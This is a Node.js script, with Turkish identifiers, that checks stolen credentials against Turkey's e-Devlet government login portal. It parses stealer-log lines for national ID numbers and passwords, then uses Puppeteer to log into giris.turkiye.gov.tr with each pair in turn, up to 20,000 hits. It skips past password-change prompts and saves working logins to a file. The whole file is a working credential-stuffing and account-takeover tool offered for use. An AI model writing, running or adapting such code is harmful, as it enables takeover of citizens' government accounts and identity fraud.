const puppeteer = require("puppeteer");
const fs = require("node:fs");
const cheerio = require("cheerio");
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));

const dosya = "Edevlet";

let loglar = [];
let unCheckedlogs = [];
let currentLog = fs.readFileSync(`./Checker/${dosya}/loglar.txt`, "utf-8").split("\n");
let decLog = fs.readFileSync(`./Checker/${dosya}/dec.txt`, "utf-8").split("\n");
const readStream = fs.createReadStream('./Checker/Loglar/message.txt', 'utf-8');

readStream.on('data', (chunk) => {
    const logs = chunk.split("\n").map(x => {

        if(!x.includes("turkiye.gov.tr")) return null;

        const eslesme = x.trim().match(/\b(\d{11}):([^:\s]+)/)
        if (!eslesme) return null;

        return `${eslesme[1].trim()}:${eslesme[2].trim()}`

    }).filter(x => x !== null);
    if (logs.length > 0) unCheckedlogs.push(...logs);
});

readStream.on('end', async () => {
    const uniqueLogsSet = new Set(loglar);

    unCheckedlogs.forEach(log => {
        const trimmedLog = log.trim();
        if (!currentLog.includes(trimmedLog) && !uniqueLogsSet.has(trimmedLog) && !decLog.includes(trimmedLog)) {
            uniqueLogsSet.add(trimmedLog);
        }
    });

    loglar = Array.from(uniqueLogsSet);

    console.log(`Dosya okuma tamamlandi checklenmeye baslandi! Toplam log sayisi: ${unCheckedlogs.length}. Filtreleme sonucu log sayisi: ${loglar.length}.`)
    checkEdevlet()
});

readStream.on('error', (err) => {
    console.error('Hata:', err);
});
const limit = 20000;

async function checkEdevlet() {

    const browser = await puppeteer.launch({
        headless: "new",
        defaultViewport: null
    })

    const pages = await browser.pages();
    let page = pages[0];

    try {

        if (!loglar.length > 0) {

            console.log("Loglar bitti.");
            const s = null;
            while (s == null) {
                
            }

        }

        let users = [];
        let i = 0 + 0;
        for (i; i < loglar.length; i++) {

            try {

                if (limit > 0 && users.length >= limit) return console.log(`Limit doldu! ${limit}/${users.length}`);

                const log = loglar[i];
                let bilgiler = log.split(":");
                if (!bilgiler) break;

                const kadi = bilgiler[0];
                const sifre = bilgiler[1];

                if (users.includes(`${kadi}:${sifre}`) || currentLog.includes(`${kadi}:${sifre}`)) {

                    console.log(`${currentLog.length}. ${kadi}:${sifre} (${i + 1}/${loglar.length}) [MULTI]`)

                }

                const response = await fetch(`https://giris.turkiye.gov.tr/Giris/gir`, {
                    "headers": {
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                        "accept-language": "tr;q=0.6",
                        "cache-control": "max-age=0",
                        "sec-ch-ua": "\"Chromium\";v=\"118\", \"Brave\";v=\"118\", \"Not=A?Brand\";v=\"99\"",
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": "\"Windows\"",
                        "sec-fetch-dest": "document",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-site": "none",
                        "sec-fetch-user": "?1",
                        "sec-gpc": "1",
                        "upgrade-insecure-requests": "1"
                    },
                    "body": null,
                    "method": "GET"
                });

                let cookies = response.headers.get("set-cookie").split(",").map(x => x.split(";")[0].trim())
                cookies = cookies.map(x => {

                    const parts = x.split("=");

                    return {
                        name: parts[0],
                        value: parts[1],
                        domain: "giris.turkiye.gov.tr"
                    }

                })

                await page.setCookie(...cookies);

                await page.goto("https://giris.turkiye.gov.tr/Giris/gir");
                await page.waitForTimeout(2000);

                await page.type("input#tridField", kadi);
                await page.type("input#egpField", sifre);
                await page.keyboard.press("Enter");

                await page.waitForTimeout(2000)

                const html = await page.content();
                const $ = cheerio.load(html);

                const passCode = $('input[name="changePasswordCode"]').val();
                if (passCode) {

                    await page.click('button.btn.btn-send[name="submitButton"][value="Devam Et"]');

                    await page.goto("https://www.turkiye.gov.tr");

                }

                if (page.url().includes("https://www.turkiye.gov.tr")) {

                    currentLog.push(`${kadi}:${sifre}`)
                    fs.writeFileSync(`./Checker/${dosya}/loglar.txt`, currentLog.join("\n"), "utf-8");

                    users.push(`${kadi}:${sifre}`)

                    console.log(`${currentLog.length}. ${kadi}:${sifre} (${i + 1}/${loglar.length})`)

                    const çerez = await page.cookies();

                    await fetch("https://www.turkiye.gov.tr/logout", {
                        "headers": {
                            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                            "accept-language": "en-US,en;q=0.9",
                            "sec-ch-ua": "\"Not=A?Brand\";v=\"99\", \"Chromium\";v=\"118\"",
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": "\"Windows\"",
                            "sec-fetch-dest": "document",
                            "sec-fetch-mode": "navigate",
                            "sec-fetch-site": "same-origin",
                            "sec-fetch-user": "?1",
                            "upgrade-insecure-requests": "1",
                            "cookie": çerez.map(x => `${x.name}=${x.value}`).join("; "),
                            "Referer": "https://www.turkiye.gov.tr/",
                            "Referrer-Policy": "unsafe-url"
                        },
                        "body": null,
                        "method": "GET"
                    });

                } else {

                    decLog.push(`${kadi}:${sifre}`);
                    fs.writeFileSync(`./Checker/${dosya}/dec.txt`, decLog.join("\n"), "utf-8");

                }

            } catch (err) {
                console.log(err)
            }

        };

        await browser.close();

        if (!users.length > 0) return console.log(`Checkleme işlemi tamamlandı! Checklenen ${i} logdan ${users.length} log çıktı! Multi check ve eski loglar ile beraber toplamda ${currentLog.length} log oldu!`);

        console.log(`Checkleme işlemi tamamlandı! Checklenen ${i} logdan ${users.length} log çıktı! Multi check ve eski loglar ile beraber toplamda ${currentLog.length} log oldu!`);
        fs.writeFileSync(`./Checker/${dosya}/loglar.txt`, currentLog.join("\n"), "utf-8");

    } catch (err) {
        console.log(err)
    }

};